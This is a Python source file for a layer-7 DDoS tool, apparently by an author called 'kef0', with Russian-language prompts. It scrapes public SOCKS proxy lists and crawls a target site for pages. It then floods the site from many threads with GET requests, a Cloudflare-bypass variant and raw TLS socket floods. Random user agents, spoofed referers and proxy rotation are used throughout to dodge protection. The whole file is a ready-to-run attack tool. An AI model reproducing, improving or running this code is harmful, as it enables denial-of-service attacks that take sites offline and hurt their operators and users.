import requests
from random import choice
import random
import threading
import socket
import ssl
import socks
from urllib.parse import urlparse
import warnings
import time
import cfscrape
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from urllib.parse import urljoin

warnings.filterwarnings("ignore", category=DeprecationWarning)

sum_req = 0
attack_list_activ_proxy = 0
list_activ_proxy = []

# Referers
# ------------------------------------------------------------
referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q="
]
# ------------------------------------------------------------

# User-Agents
# ------------------------------------------------------------
UserAgent_rand = UserAgent()
# ------------------------------------------------------------

# Check proxy
# ------------------------------------------------------------
def check_proxy(proxy, r_orgip):
    headers = {
        'User-Agent': UserAgent_rand.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Referer': 'https://www.google.com/',
        'Upgrade-Insecure-Requests': '1',
    }
    
    proxies = {
        'http': proxy,
        'https': proxy
    }
    
    try:
        r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=5)
        if r.status_code == 200:
            data = r.json()
            ip = data.get('origin', 'Не найден')
            if (ip == r_orgip):
                list_proxy.remove(proxy)
        else:
            list_proxy.remove(proxy)
    except:
        list_proxy.remove(proxy)
# ------------------------------------------------------------

# Proxy
# ------------------------------------------------------------
print("[INFO] Поиск прокси...")

list_proxy = []

proxy_url = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/socks5.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks5://{proxy}'
    list_proxy.append(prx)

proxy_url = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/socks5.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks5://{proxy}'
    list_proxy.append(prx)

proxy_url = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/socks4.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks4://{proxy}'
    list_proxy.append(prx)

proxy_url = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/socks4.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks4://{proxy}'
    list_proxy.append(prx)

proxy_url = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks5://{proxy}'
    list_proxy.append(prx)

proxy_url = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks4://{proxy}'
    list_proxy.append(prx)

proxy_url = requests.get("https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    list_proxy.append(proxy)

proxy_url = requests.get("https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks4/data.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    list_proxy.append(proxy)
    
proxy_url = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/refs/heads/master/proxy.txt")
proxys = str(proxy_url.text).split()
for proxy in proxys:
    prx = f'socks5://{proxy}'
    list_proxy.append(prx)

try:
    site_urls = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"
    ]
    for site_url in site_urls:
        try:
            response = requests.get(site_url, timeout=10)
            if response.status_code == 200:
                protocol = "socks4" if "socks4" in site_url else "socks5"
                for line in response.text.strip().split('\n'):
                    if line.strip():
                        list_proxy.append(f"{protocol}://{line.strip()}")
        except:
            pass
except:
    pass

try:
    response = requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4%2Csocks5&limit=500", timeout=10)
    data = response.json()
    for proxy in data.get('data', []):
        ip = proxy.get('ip')
        port = proxy.get('port')
        protocols = proxy.get('protocols', [])
        if ip and port:
            if 'socks5' in protocols:
                list_proxy.append(f"socks5://{ip}:{port}")
            elif 'socks4' in protocols:
                list_proxy.append(f"socks4://{ip}:{port}")
except:
    pass
    
list_proxy = list(set(list_proxy))

print("[INFO] Проверка прокси...")

while True:
    try:
        r_orgip = requests.get("https://httpbin.org/ip", timeout=5)
        r_orgip = r_orgip.json()
        r_orgip = r_orgip.get('origin', 'Не найден')
        break
    except:
        time.sleep(5)
        continue

for proxy in list_proxy:
    threading.Thread(target=check_proxy, args=(proxy, r_orgip)).start()
time.sleep(10)
# ------------------------------------------------------------

# Crawler
# ------------------------------------------------------------
def crawl(url):
    while True:
        scraper = cfscrape.create_scraper()

        headers = {
            'User-Agent': UserAgent_rand.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': choice(referers) + url,
            'Upgrade-Insecure-Requests': '1',
        }

        try:
            response = scraper.get(url, headers=headers, timeout=1)
        except:
            continue

        soup = BeautifulSoup(response.text, 'html.parser')
        links = []

        for link in soup.find_all('a', href=True):
            try:
                full_url = urljoin(url, link['href'])
                valid_url = full_url.split("/")
                if (valid_url[2] == url.replace("https://", "").replace("http://", "").replace("/", "")):
                    links.append(full_url)
            except:
                continue
        break

    links.append(str(url))
    links = list(set(links))
    return links
# ------------------------------------------------------------

# Main
# ------------------------------------------------------------
def main():
    print(fr'''
______ ________________ ________        ________
___  / ___  __/___  __ \___  __ \______ __  ___/
__  /  __  /   __  / / /__  / / /_  __ \_____ \ 
_  /____  /    _  /_/ / _  /_/ / / /_/ /____/ / 
/_____//_/     /_____/  /_____/  \____/ /____/

################################################
#                    DDoS L7                   #
#                 coded by kef0                #
################################################

[INFO] Прокси найдено: {len(list_proxy)}
    ''')

    url = input("Введите URL сайта: ")
    print("\n[INFO] Проверка сайта...")
    links = crawl(url)

    try:
        ip_url = url.replace('https://', '').replace('http://', '').replace('/', '')
        ip = socket.gethostbyname(ip_url)
        ip_info = requests.get(f'https://ipinfo.io/{ip}/json').json()
        ip_info = ip_info['org']

        try:
            host = socket.gethostbyaddr(ip)[0]
            print(f"\n[INFO] Информация о сайте ({url}):"
                      f"\n --> [*] IP: {str(ip)}"
                      f"\n --> [*] Host: {str(host)}"
                      f"\n --> [*] Organization: {ip_info}"
                      f"\n --> [*] Crawler: {len(links)} страниц")
        except:
            print(f"\n[INFO] Информация о сайте ({url}):"
                      f"\n --> [*] IP: {str(ip)}"
                      f"\n --> [!] Host: Не найдено, возможно на сайте есть защита от DDoS!"
                      f"\n --> [*] Organization: {ip_info}"
                      f"\n --> [*] Crawler: {len(links)} страниц")
    except:
        print('\n[INFO] Информация о сайте не получина!')
        pass

    print('''
Методы атаки:
[1] GET
[2] GET Bypass Cloud-Flare
[3] BYPASS-SOCKS
    ''')

    method = input("Выбирите метод атаки: ")
    use_proxy = input("Использовать прокси? [Y/n]: ")
    thrds = input("Введите колличество потоков: ")
    thrds = int(thrds)
    if (use_proxy != 'N' and use_proxy != 'n'):
        use_activ_proxy = input("Переключать атаку на активные прокси, когда они превысят введенное вами кол-во? [y/N]: ")
        if (use_activ_proxy == 'Y' or use_activ_proxy == 'y'):
            sum_use_activ_proxy = input("Введите кол-во активных прокси для переключения: ")
            sum_use_activ_proxy = int(sum_use_activ_proxy)
        else:
            sum_use_activ_proxy = 0
    else:
        use_activ_proxy = 'N'
        sum_use_activ_proxy = 0

    if (url != '' and thrds != ''):
        print('\n[INFO] Атака началась...')

        threading.Thread(target=CSS, args=(url, sum_use_activ_proxy, use_proxy, use_activ_proxy)).start()
        
        for i in range(thrds):
            if(method == "1"):
                threading.Thread(target=GET, args=(links, use_proxy)).start()
            elif (method == "2"):
                threading.Thread(target=GET_CFB, args=(links, use_proxy)).start()
            elif(method == "3"):
                threading.Thread(target=BYPASS_SOCKS, args=(url, use_proxy)).start()
            else:
                main()
    else:
        main()
# ------------------------------------------------------------

# Check Status Site
# ------------------------------------------------------------
def CSS(url, sum_use_activ_proxy, use_proxy, use_activ_proxy):
    while True:
        if (use_proxy == 'N' or use_proxy == 'n'):
            proxy = str(choice(list_proxy))
        else:
            global attack_list_activ_proxy
            global list_activ_proxy
            list_activ_proxy = list(set(list_activ_proxy))

            if (use_activ_proxy == 'Y' or use_activ_proxy == 'y'):
                sum_activ_proxy = len(list_activ_proxy)
                if (attack_list_activ_proxy == 0):
                    if (int(sum_activ_proxy) >= int(sum_use_activ_proxy)):
                        attack_list_activ_proxy = 1
                        print(f'\n[+] [INFO] Кол-во активных прокси превысило {sum_use_activ_proxy} шт\n --> Переключение на активные прокси: {str(sum_activ_proxy)} шт\n')

            try:
                proxy = str(choice(list_activ_proxy))
            except:
                continue

        scraper = cfscrape.create_scraper()

        headers = {
            'User-Agent': UserAgent_rand.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': choice(referers) + url,
            'Upgrade-Insecure-Requests': '1',
        }

        proxies = {
            'http': proxy,
            'https': proxy
        }

        try:
            if (use_proxy == 'N' or use_proxy == 'n'):
                r = scraper.get(url, headers=headers, timeout=5)
                time.sleep(10)
                try:
                    resp_time = r.elapsed.total_seconds()
                except:
                    resp_time = 0
                print(f'\n[INFO] Проверка атакуемого сайта\n --> Статус код сайта: {r.status_code}\n --> Время ответа: {str(resp_time)}\n --> Запросов отправленно: {str(sum_req)}\n')
            else:
                r = scraper.get(url, headers=headers, proxies=proxies, timeout=5)
                time.sleep(10)
                try:
                    resp_time = r.elapsed.total_seconds()
                except:
                    resp_time = 0
                print(f'\n[INFO] Проверка атакуемого сайта\n --> Статус код сайта: {r.status_code}\n --> Время ответа: {str(resp_time)}\n --> Запросов отправленно: {str(sum_req)}\n --> Кол-во активных прокси: {str(sum_activ_proxy)} шт\n')
        except:
            continue
# ------------------------------------------------------------

# Attack method GET
# ------------------------------------------------------------
def GET(links, use_proxy):
    while True:
        global sum_req
        global list_activ_proxy
        time.sleep(random.uniform(1, 5))
        url = str(choice(links))
        payload = str(random.randint(10, 150))

        headers = {
            'User-Agent': UserAgent_rand.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': choice(referers) + url,
            'Upgrade-Insecure-Requests': '1',
        }

        if (attack_list_activ_proxy == 0):
            proxy = str(choice(list_proxy))
        else:
            proxy = str(choice(list_activ_proxy))

        proxies = {
            'http': proxy,
            'https': proxy
        }

        try:
            while True:
                if (use_proxy == 'N' or use_proxy == 'n'):
                    r = requests.get(url, params=payload, headers=headers, timeout=3)
                    if (r.status_code == 200):
                        sum_req += 1
                else:
                    r = requests.get(url, params=payload, headers=headers, proxies=proxies, timeout=3)
                    if (r.status_code == 200):
                        list_activ_proxy.append(str(proxy))
                        sum_req += 1
        except:
            continue
# ------------------------------------------------------------

# Attack method GET Bypass Cloud-Flare
# ------------------------------------------------------------
def GET_CFB(links, use_proxy):
    while True:
        global sum_req
        global list_activ_proxy
        time.sleep(random.uniform(1, 5))
        scraper = cfscrape.create_scraper()
        url = str(choice(links))
        payload = str(random.randint(10, 150))

        headers = {
            'User-Agent': UserAgent_rand.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': choice(referers) + url,
            'Upgrade-Insecure-Requests': '1',
        }

        if (attack_list_activ_proxy == 0):
            proxy = str(choice(list_proxy))
        else:
            proxy = str(choice(list_activ_proxy))

        proxies = {
            'http': proxy,
            'https': proxy
        }

        try:
            while True:
                if (use_proxy == 'N' or use_proxy == 'n'):
                    r = scraper.get(url, params=payload, headers=headers, timeout=3)
                    if (r.status_code == 200):
                        sum_req += 1
                else:
                    r = scraper.get(url, params=payload, headers=headers, proxies=proxies, timeout=3)
                    if (r.status_code == 200):
                        list_activ_proxy.append(str(proxy))
                        sum_req += 1
        except:
            continue
# ------------------------------------------------------------

# Attack method BYPASS-SOCKS
# ------------------------------------------------------------
def BYPASS_SOCKS(url, use_proxy):
    while True:
        global list_activ_proxy

        proxy = str(choice(list_proxy))
        try:
            proxy_check = proxy.split(":")
            proxy_type = str(proxy_check[0])
            proxy_ip = proxy.replace("socks5://", "").replace("socks4://", "")
            prx = proxy_ip.split(":")
            proxy_ipadr = str(prx[0])
            proxy_port = int(prx[1])
        except:
            continue

        req = 'User-Agent: ' + UserAgent_rand.random + '\r\n'
        req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
        req += 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n'
        req += 'Accept-Encoding: gzip, deflate\r\n'
        req += 'Connection: keep-alive\r\n'
        req += 'Referer: ' + choice(referers) + url + '\r\n'
        req += 'Upgrade-Insecure-Requests: 1'

        try:
            s = socks.socksocket()

            if (use_proxy == 'N' or use_proxy == 'n'):
                pass
            else:
                if(proxy_type == "socks5"):
                    s.set_proxy(socks.SOCKS5, str(proxy_ipadr), int(proxy_port))
                elif(proxy_type == "socks4"):
                    s.set_proxy(socks.SOCKS4, str(proxy_ipadr), int(proxy_port))

            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))

            global sum_req
            sum_req += 1

            if (use_proxy == 'N' or use_proxy == 'n'):
                pass
            else:
                list_activ_proxy.append(str(proxy))
        except:
            s.close()
# ------------------------------------------------------------

main()